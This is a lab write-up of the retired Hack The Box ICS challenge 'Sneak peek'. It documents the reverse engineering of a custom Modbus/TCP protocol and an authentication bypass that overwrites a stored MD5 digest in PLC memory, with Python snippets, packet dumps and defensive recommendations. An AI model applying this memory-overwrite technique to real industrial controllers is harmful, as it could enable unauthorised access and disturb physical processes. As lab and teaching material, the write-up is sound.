---
title: "Hack The Box Challenge — Sneak peek"
summary: "A custom Modbus/TCP service exposes PLC memory writes, allowing a stored MD5 password digest to be replaced and authentication bypassed safely."
platform: "Hack The Box"
contentType: "challenge"
publicationPolicy: "retired"
challengeCategory: "Hardware"
difficulty: "Easy"
solvedAt: 2026-09-19
publishedAt: 2026-09-19
tags:
  - ics-security
  - ot-security
  - modbus-tcp
  - custom-protocol
  - plc-memory
  - authentication-bypass
  - python
tools:
  - Python
  - Netcat
cves: []
htbUrl: "https://app.hackthebox.com/challenges/Sneak%2520peek"
cover: "/images/writeups/hackthebox/challenges/shared/hackthebox-challenge-cover.webp"
coverAlt: "Abstract cybersecurity challenge medallion with terminal, puzzle and network motifs"
featured: false
draft: false
---

> **Authorized-lab notice:** This write-up documents the retired Hack The Box Challenge Sneak peek. Its retired status was explicitly confirmed before publication on 19 September 2026. The real flag, ephemeral target address, personal test values and unrelated sensitive information have been removed. The original challenge package is not redistributed.

More retired Hack The Box material is available in the [write-ups archive](/writeups/) and the focused [Challenges archive](/writeups/challenges/).

## Executive summary

Sneak peek presents a network-accessible PLC service that implements a small proprietary protocol inside Modbus/TCP. The supplied protocol diagram documents operations for reading a 16 KiB memory block, writing arbitrary bytes into that block and requesting a protected secret. Authentication is based on an MD5 password digest stored inside the same writable memory.

The important weakness is not MD5 cracking. The service gives an unauthenticated client both the read primitive needed to locate the stored 16-byte digest and the write primitive needed to replace it. A full memory read identified one isolated 16-byte non-zero entry at offset `0x0400`. Replacing that value with the MD5 digest of a known password made the secret request succeed. The solver then restored the original digest and verified the restoration byte for byte.

This is an authentication-bypass challenge built around insecure PLC memory access, custom protocol analysis and safe state restoration.

## Challenge information

| Item | Value |
| --- | --- |
| Name | `Sneak peek` |
| Platform | Hack The Box |
| HTB category | ICS |
| Portfolio category | Hardware |
| Difficulty | Easy |
| Status | Retired, confirmed 19 September 2026 |
| Core weakness | Unauthenticated read/write access to authentication state |
| Transport | Custom function inside Modbus/TCP |

Hack The Box categorizes the challenge as **ICS**. This portfolio currently groups it under **Hardware**, the closest supported category for direct interaction with PLC memory and industrial protocols.

## Provided material and evidence boundaries

The challenge package supplied two files:

```text
client.py
protocol_information.png
```

The original files remain local and are not included in this repository. Their SHA-256 values identify the evidence used during the solve:

```text
a2d2733843c2e48aaa794c0bce9aff7d8308735e2b3232c1d0b7e09236479c63  client.py
76fb0674b5c32d6c4665162e248175214b8a12cea0ea072b567a63b67a60acae  protocol_information.png
```

`client.py` was a partially configured `pymodbus` client. It supplied request and response class templates but deliberately left the host, port, custom function code and request data incomplete. Its comments recorded the expected environment as Python 3.9.18 with `pymodbus==3.5.4`.

The protocol image contained the information required to complete the client:

| Field | Value |
| --- | --- |
| Outer custom Modbus function | `0x64` |
| Memory size | `16 × 1024` bytes |
| Read memory operation | `0x20` |
| Write memory operation | `0x21` |
| Get secret operation | `0x22` |
| Session | `0x00` |
| Invalid-password error | `0xE009` |

The operation-specific request data was documented as:

```text
read:       [address byte 0][address byte 1][address byte 2][length]
write:      [address byte 0][address byte 1][address byte 2][data...]
get_secret: [password...]
```

The public solver linked later is our own sanitized derivative. It contains no flag, fixed target, personal path or original HTB asset.

## Initial protocol analysis

### Confirming the service

The target was an ephemeral HTB instance, so its real address is replaced with placeholders. A TCP connection check confirmed that the assigned port was reachable:

```bash
nc -vz -w 5 <TARGET> <PORT>
```

```text
<TARGET> <PORT> open
```

The expected `pymodbus` dependency was not installed in the Kali environment:

```bash
python3 - <<'PY'
import pymodbus
print(pymodbus.__version__)
PY
```

```text
ModuleNotFoundError: No module named 'pymodbus'
```

Installing another dependency was unnecessary. Modbus/TCP framing is small enough to reproduce with Python's standard `socket` and `struct` modules.

### Reconstructing a request

A Modbus/TCP message begins with a seven-byte MBAP header:

```text
[transaction id:2][protocol id:2][length:2][unit id:1]
```

The Protocol Data Unit used by this challenge then begins with the outer function `0x64`, followed by the documented session, inner operation and operation data:

```text
[0x64][session][operation][operation data...]
```

The first read-only probe requested 32 bytes from address zero:

```python
payload = bytes([
    0x00,       # session
    0x20,       # read_memory_block
    0x00, 0x00, 0x00,
    0x20,       # 32 bytes
])
```

The response was:

```text
MBAP tid=1 protocol=0 length=37 unit=1
PDU  64 00 20 ff 01 5a e7 25 9b 7b 14 b2 00 96 13 36 34 de d5 fa
     59 55 c9 00 12 bf 00 0a df 94 00 e1 1e 5a 34 9e
```

The first four PDU bytes have clear meanings:

```text
64  outer custom function
00  session
20  read operation
ff  success status
```

The remaining 32 bytes are the requested memory. This proved both the packet layout and the ability to read arbitrary PLC memory without authentication.

## Dumping and classifying PLC memory

The complete memory block was read in `0xFF`-byte chunks. A one-byte length field made `255` the natural maximum per documented read request:

```python
memory = bytearray()

for address in range(0, 16 * 1024, 0xFF):
    length = min(0xFF, 16 * 1024 - address)
    request_data = address.to_bytes(3, "big") + bytes([length])
    memory.extend(read_block(request_data))

print(f"Dumped {len(memory)} bytes")
```

```text
Dumped 16384 bytes
MD5-like ASCII candidates:
Printable strings (length >= 8):
```

The empty searches mattered. The password digest was not stored as a 32-character hexadecimal MD5 string, and the memory did not contain a helpful plaintext label. A raw MD5 digest is 16 bytes, so the next step was to inspect the binary record structure rather than printable strings.

The zero bytes visible in the first probe acted as delimiters. Searching for non-zero runs of at least 16 bytes produced two relevant regions:

```python
for match in re.finditer(rb"[^\x00]{16,}", memory):
    print(hex(match.start()), len(match.group()), match.group().hex())
```

The useful portion of the output was:

```text
offset 0x0400, length 16: 3f9b2b9e6e7885a1068076dbdaf76d15
offset 0x0807, length 14329: ff ff ff ff ...
```

The second region was erased or unused `0xFF` filler. The isolated entry at `0x0400` was exactly 16 bytes long and therefore matched the expected size of the raw password digest.

## Failed approaches and course corrections

### Looking for printable MD5 text

The first full-memory analysis searched for `[0-9a-f]{32}` and printable strings. That would have found a hexadecimal MD5 representation, but both searches returned nothing. The result redirected the analysis toward a raw 16-byte digest.

### Writing to address zero

Before the correct entry was localized, a controlled test temporarily placed the digest of a known password at address `0x000000`. The write succeeded, but `get_secret` returned the documented authorization error:

```text
[+] Known MD5 written temporarily
operation 0x22 failed, status/data: f0 e0 09
[+] Original memory restored
```

The trailing bytes `e0 09` encode error `0xE009`, confirming that authentication still failed. More importantly, the original 16 bytes were restored in a `finally` block. This disproved the hypothesis that the server searched the whole memory block for any matching digest; it used a specific location.

### Rejecting a broad memory spray

A possible brute-force method was to fill the memory with repeated copies of a known digest under all 16 byte alignments. That would have caused more than one thousand writes and unnecessarily modified nearly the entire PLC memory. It was not executed. Locating the isolated 16-byte record reduced the final method to one targeted write and one restoration write.

### External assistance disclosure

After the initial raw dump and failed address-zero test, a public community write-up was consulted. It suggested splitting the memory at zero bytes and examining entries of at least 16 bytes. The local dump was then reanalyzed independently, producing the verified `0x0400` offset and the exact 16-byte candidate shown above. No official write-up text or code was copied.

## Exploiting the authentication design

Cracking the original MD5 was not required. The attacker controls both sides of the comparison:

1. Choose any known password.
2. Calculate its raw 16-byte MD5 digest.
3. Back up the original digest at `0x0400`.
4. Write the known digest to that address with operation `0x21`.
5. Send the known plaintext password with operation `0x22`.
6. Receive the protected secret.
7. Restore and verify the original digest.

The published solver uses the neutral lab value `known_password`. The actual solve used another locally chosen test string; changing that string does not change the vulnerability or the result because the solver writes the corresponding digest before authenticating.

The decisive logic is:

```python
known_password = b"known_password"
known_digest = hashlib.md5(known_password).digest()

memory = read_memory(client)
address, original_digest = find_hash_entry(memory)

try:
    client.write(address, known_digest)
    secret = client.get_secret(known_password)
finally:
    client.write(address, original_digest)
    assert client.read(address, 16) == original_digest
```

This is password-hash replacement, not password recovery.

## Verified solver

The final solver uses only Python's standard library and performs four safety checks:

- validates Modbus/TCP transaction IDs and protocol IDs;
- requires exactly one plausible isolated 16-byte hash entry;
- restores the original digest inside a `finally` block;
- reads the digest back and compares it byte for byte after restoration.

[Download the sanitized Sneak peek solver](/files/writeups/hackthebox/challenges/hardware/sneak-peek/solve_sneak_peek.py).

Run it against a fresh retired-challenge instance:

```bash
python3 solve_sneak_peek.py <TARGET> <PORT>
```

The sanitized form of the verified output is:

```text
[*] Candidate MD5 entry: 0x0400
[+] Secret: HTB{<REDACTED_FLAG>}
[+] Original hash restored and verified
```

The remote solve returned an HTB-formatted secret. The value is intentionally redacted from this public article and the downloadable script.

## Validation

The exploit was validated through observable protocol and state evidence:

1. The full read returned exactly `16384` bytes, matching the supplied memory size.
2. The candidate at `0x0400` was exactly 16 bytes, matching a raw MD5 digest.
3. A wrong-location replacement produced error `0xE009` rather than a secret.
4. Replacing the candidate digest made the same password succeed immediately.
5. The response contained a correctly bounded `HTB{...}` token.
6. The original 16-byte value was written back and a fresh read confirmed an exact match.

The final run therefore verified both exploitation and cleanup. It did not leave the known password digest installed in the PLC memory.

## Why the attack works

The system treats an MD5 digest as an authentication boundary while exposing the storage that contains that digest through unauthenticated read and write operations. The strength or crack resistance of the original password is irrelevant once an attacker can replace the verifier.

Conceptually, the check is equivalent to:

```python
if md5(user_password).digest() == memory[PASSWORD_OFFSET:PASSWORD_OFFSET + 16]:
    return secret
```

Operation `0x21` lets an unauthenticated client control the right-hand side of that comparison. The attacker can therefore choose a password, install its digest and satisfy the check without learning the original password.

MD5 is unsuitable for password storage because it is fast and unsalted, but replacing it with a modern password hash would not fix this challenge's primary flaw. Any verifier becomes ineffective if an unauthenticated network client can overwrite it.

## Defensive perspective

| Weakness | Defensive control |
| --- | --- |
| Unauthenticated Modbus access | Restrict PLC access through segmentation, allow-lists and authenticated gateways |
| Read access to credential material | Keep secrets outside general-purpose process memory and deny protocol-level reads |
| Arbitrary memory writes | Expose narrowly scoped operations rather than raw address-based writes |
| Password verifier stored in writable memory | Protect authentication state with hardware or OS-backed access controls |
| MD5 password hashing | Use a salted password KDF such as Argon2id, scrypt or bcrypt |
| No integrity protection | Use a secure transport or gateway that authenticates commands and detects tampering |
| Limited operational visibility | Alert on custom Function `0x64`, especially inner operation `0x21` followed by `0x22` |

In a real operational environment, arbitrary writes can affect availability or physical processes. Testing should begin with passive capture and read-only enumeration, minimize writes, back up original values and include a verified restoration plan.

## Key takeaways

- Reverse engineer both the outer Modbus/TCP frame and the inner proprietary protocol before sending state-changing requests.
- Treat binary structure as evidence when string searches fail; a raw MD5 digest is 16 bytes, not 32 ASCII characters.
- A strong password cannot compensate for an attacker-writable password verifier.
- Prefer targeted writes over broad memory modification, especially in ICS and OT environments.
- Build restoration and read-back verification into the exploit rather than treating cleanup as a manual afterthought.
- Document failed hypotheses because they establish what the service does and does not check.

## References

- [Hack The Box — Sneak peek](https://app.hackthebox.com/challenges/Sneak%2520peek)
- Supplied `protocol_information.png` and `client.py` artifacts (not redistributed)
- [X3ric — HackTheBox Sneak peek Challenge](https://blog.x3ric.com/posts/HackTheBox-Sneak-peek-Challenge/) — consulted after the initial failed offset hypothesis to identify the zero-delimited entry strategy
